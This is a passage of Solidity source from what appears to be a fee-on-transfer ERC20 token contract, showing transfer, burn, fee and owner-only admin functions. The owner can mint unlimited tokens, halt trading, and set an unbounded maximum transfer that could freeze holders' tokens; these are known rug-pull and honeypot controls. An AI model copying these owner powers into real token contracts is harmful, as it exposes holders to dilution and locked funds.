        require( _amount <= balanceOf(_account));
        _balances[_account] = (_balances[_account] - _amount);
        _totalSupply = (_totalSupply - _amount);
        _totalBurned = (_totalBurned + _amount);
        emit Transfer(_account, address(0), _amount);
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function setMaxTransfer(uint256 maxTransfer) public onlyOwner() {
        _maxTransfer = maxTransfer;
    }

    function setSwapFees(bool swapFees) public onlyOwner() {
        _swapFees = swapFees;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal override {
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function mint(address account, uint256 amount) public onlyOwner() {
        _mint(account, amount);
    }

    function airdrop(address[] memory accounts, uint256[] memory amounts) public onlyOwner() {
        require(accounts.length == amounts.length, "array lengths must match");

        for (uint256 i = 0; i < accounts.length; i++) {
            _mint(accounts[i], amounts[i]);
        }
    }

    function totalBurned() public view returns (uint256) {
        return _totalBurned;
    }

    function updateSellFees(uint256 _sellMarketingFee, uint256 _sellTreasuryFee, uint256 _liquidityFee, uint256 _reflectionFee, uint256 _autoBurnFee, uint256 _earlySellTreasuryFee, uint256 _earlySellMarketingFee) external onlyOwner {
        _marketingFee = _sellMarketingFee;
        _treasuryFee = _sellTreasuryFee;
        _autoLiquidityRate = _liquidityFee;

        _reflectRate = _reflectionFee;
        _autoBurnRate = _autoBurnFee;

        _treasuryFeeEarlySell = _earlySellTreasuryFee;
        _marketingFeeEarlySell = _earlySellMarketingFee;

        _totalFees = (_marketingFee + _autoLiquidityRate + _treasuryFee);
        _TotalEarlySellFees = (_marketingFeeEarlySell + _treasuryFeeEarlySell + _autoLiquidityRate);
        require(_totalFees <= 25, "Must keep fees at 25% or less");
        require(_TotalEarlySellFees <= 25, "Must keep fees at 25% or less");
    }

    function getTotalFee() public view returns (uint256) {
        return _totalFees;
    }

    function getTotalEarlySellFee() public view returns (uint256) {
        return _TotalEarlySellFees;
    }

    function setMaxWallet(uint256 amount) public onlyOwner() {
        require(amount >= _totalSupply / 1000);
        _maxWallet = amount;
    }

    function setMaxTransaction(uint256 amount) public onlyOwner() {
        require(amount >= _totalSupply / 1000);
        _maxTransfer = amount;
    }

	function setSwapFeesAt(uint256 amount) public onlyOwner() {
        _swapFeesAt = amount;
    }

    function setTradingActive(bool active) public onlyOwner() {
        _tradingActive = active;
    }

	function setUseEarlySellTime(bool useSellTime) public onlyOwner() {
        useEarlySellTime = useSellTime;
    }

	function setUseCooldown(bool useCooldown) public onlyOwner() {
        useBuyCooldown = useCooldown;
    }

    receive() external payable {}
}